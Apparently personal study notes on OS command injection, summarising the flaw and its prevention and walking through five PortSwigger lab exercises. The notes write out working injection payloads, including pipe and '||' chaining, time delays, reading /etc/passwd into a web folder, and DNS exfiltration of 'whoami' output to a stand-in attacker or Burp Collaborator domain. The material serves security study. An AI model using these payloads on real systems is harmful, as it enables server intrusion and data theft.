- [OS Command Injection](https://www.hackingarticles.in/comprehensive-guide-on-os-command-injection/) 
- https://portswigger.net/web-security/os-command-injection
- https://book.hacktricks.xyz/pentesting-web/command-injection

## Summary
OS command injection (also called shell injection) is a web security vulnerability that allows attackers to execute arbitrary operating system commands on the server running an application, typically with the same privileges as the application itself.

This vulnerability occurs when an application passes unsafe user-supplied data to a system shell. An attacker can inject additional commands to be executed by the operating system using shell metacharacters.

### Common Injection Characters:
- Semicolons (`;`) to terminate commands
- Ampersands (`&`, `&&`) for command chaining
- Pipes (`|`) to redirect output
- Backticks (`` ` ``) or `$()` for command substitution

### Types of OS Command Injection:
1. **In-band injection**: Results are returned directly in the application's response
2. **Blind injection**: No direct output, requires techniques like:
    - Time delays (using `sleep` or similar commands)
    - Out-of-band techniques (forcing DNS lookups or HTTP requests)
    - File operations (writing to accessible locations)

### Detection Methods
- Testing with platform-specific commands (Windows: `dir`, Unix: `ls`)
- Injecting command separators and monitoring responses
- Using time-based techniques for blind scenarios

### Exploitation Examples

- Basic injection: `& echo vulnerability confirmed &`
- Command chaining: `input=original-input && whoami`
- DNS exfiltration: `& nslookup attacker-controlled-domain.com &`
- Data exfiltration through file redirection: `& cat /etc/passwd > /var/www/html/accessible-file.txt &`

### Common Vulnerable Functions
Programming language functions that often lead to command injection:
- PHP: `system()`, `exec()`, `shell_exec()`, `passthru()`
- Python: `os.system()`, `subprocess.call()`, `subprocess.Popen()`
- Java: `Runtime.exec()`, `ProcessBuilder`
- NodeJS: `child_process.exec()`

### Prevention Techniques
1. **Avoid OS commands**: Use built-in application language functions instead
2. **Input validation**: Implement strict whitelisting
3. **Context-specific output encoding**
4. **Use safer APIs**: Instead of passing strings to shell interpreters, use safer system call APIs
5. **Run with limited privileges**: Apply least privilege principle
6. **Web Application Firewalls**: As an additional layer of defense


## **1. OS command injection, simple case**
This lab contains an [OS command injection](https://portswigger.net/web-security/os-command-injection) vulnerability in the product stock checker.

The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.

1. Use Burp Suite to intercept and modify a request that checks the stock level.
2. Modify the `storeID` parameter, giving it the value `1|whoami`.
3. Observe that the response contains the name of the current user.

Analysis:
	![[Pasted image 20241006185925.png]]

| Purpose of command    | Linux         | Windows         |
| --------------------- | ------------- | --------------- |
| Name of current user  | `whoami`      | `whoami`        |
| Operating system      | `uname -a`    | `ver`           |
| Network configuration | `ifconfig`    | `ipconfig /all` |
| Network connections   | `netstat -an` | `netstat -an`   |
| Running processes     | `ps -ef`      | `tasklist`      |
![[Pasted image 20241006185012.png]]

## **2. Blind OS command injection with time delays**
This lab contains a blind [OS command injection](https://portswigger.net/web-security/os-command-injection) vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.

1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Modify the `email` parameter, changing it to:
    `email=x ||ping + -c + 10 + 127.0.0.1||`

Analysis:

- after subbmiting the form we obsrve that every input field is accepted so we will find out which one it is susceptible for OS injection
	![[Pasted image 20241007180502.png]]

- for each field (name/email/subject) --> `|| sleep 10 #`  and URL encode it
	![[Pasted image 20241007180742.png]]
	![[Pasted image 20241007181105.png]]

## **3. Blind OS command injection with output redirection**
This lab contains a blind [OS command injection](https://portswigger.net/web-security/os-command-injection) vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at: `/var/www/images/`

The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file. To solve the lab, execute the `whoami` command and retrieve the output.

1. Modify the `email` parameter, changing it to:
    `email= || whoami>/var/www/images/output.txt ||`
2. Now use Burp Suite to intercept and modify the request that loads an image of a product.
3. Modify the `filename` parameter, changing the value to the name of the file you specified for the output of the injected command:
    `filename=output.txt`
4. Observe that the response contains the output from the injected command.

Analysis:

- Confirm blind command injection
	email field  (submit feedback form page)

![[Pasted image 20241007200025.png]]

- Check where images are stored
	`GET/image?filename=x.jpg` --> /var/www/images
	![[Pasted image 20241007200116.png]]
	
-  Redirect output to file
	email= x `|| whoami > /var/www/images/output.txt #` (url encode it)
	![[Pasted image 20241007201334.png]]
	
- Check if file was created 
	`GET/image?filname=output.txt` 
	![[Pasted image 20241007201453.png]]

## 4. Blind OS command injection with out-of-band interaction

This lab contains a blind OS [command injection](https://portswigger.net/web-security/os-command-injection) vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator.

1. Modify the `email` parameter, changing it to:
    `email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`
 
Analysis:
![[Pasted image 20241008193453.png]]

## 5. Blind OS command injection with out-of-band data exfiltration
This lab contains a blind [OS command injection](https://portswigger.net/web-security/os-command-injection) vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, execute the `whoami` command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.

1. Modify the `email` parameter, changing it to something like the following, but insert your Burp Collaborator subdomain where indicated:
    ``email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||``
2. Go back to the Collaborator tab, and click "Poll now". You should see some DNS interactions that were initiated by the application as the result of your payload. If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously.
3. Observe that the output from your command appears in the subdomain of the interaction, and you can view this within the Collaborator tab. The full domain name that was looked up is shown in the Description tab for the interaction.

Analysis:
![[Pasted image 20241008194047.png]]
